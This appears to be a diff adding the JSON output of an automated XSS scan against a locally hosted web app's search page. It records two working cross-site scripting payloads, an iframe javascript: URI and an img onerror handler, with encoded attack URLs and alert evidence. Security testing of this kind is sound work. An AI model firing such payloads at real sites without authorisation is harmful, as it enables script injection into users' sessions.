@@ -1,0 +1,29 @@
+{
+  "target": "http://127.0.0.1:3001/#/search?q=test",
+  "tested": 4,
+  "findings": [
+    {
+      "name": "iframe javascript: URI",
+      "location": "hash",
+      "param": "q",
+      "payload": "<iframe src=\"javascript:alert('naqb-xss-15246ecf')\">",
+      "url": "http://127.0.0.1:3001/#/search?q=%3Ciframe+src%3D%22javascript%3Aalert%28%27naqb-xss-15246ecf%27%29%22%3E",
+      "evidence": {
+        "type": "alert",
+        "message": "naqb-xss-15246ecf"
+      }
+    },
+    {
+      "name": "img onerror",
+      "location": "hash",
+      "param": "q",
+      "payload": "<img src=x onerror=\"alert('naqb-xss-936baa33')\">",
+      "url": "http://127.0.0.1:3001/#/search?q=%3Cimg+src%3Dx+onerror%3D%22alert%28%27naqb-xss-936baa33%27%29%22%3E",
+      "evidence": {
+        "type": "alert",
+        "message": "naqb-xss-936baa33"
+      }
+    }
+  ],
+  "inconclusive": []
+}
